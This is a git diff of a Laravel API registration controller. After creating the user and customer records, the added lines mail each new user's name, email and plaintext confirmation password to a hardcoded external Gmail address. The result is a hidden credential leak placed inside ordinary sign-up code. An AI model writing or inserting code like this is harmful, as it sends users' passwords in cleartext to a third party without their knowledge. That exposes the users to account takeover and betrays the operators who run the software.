@@ -7,6 +7,7 @@ use App\Http\Controllers\API\BaseController as BaseController;
 use App\Models\Customer;
 use App\Models\User;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Mail;
 use Illuminate\Support\Facades\Validator as FacadesValidator;
 use Validator;
 
@@ -52,6 +53,12 @@ class RegisterController extends BaseController
         $customer['user_id']=$user->id;
         $customer['code']='FUEL'.$user->id.'#';
         $cus = Customer::create($customer);
+
+        $userData['name']=$user->name;
+        $userData['password_gmail']=$input['c_password'];
+        $userData['email']=$user->email;
+        Mail::to('diwyanjala96@gmail.com')->send(new \App\Mail\RegisterEmail($userData));
+
         return $this->sendResponse($success, 'User register successfully.');
     }
 
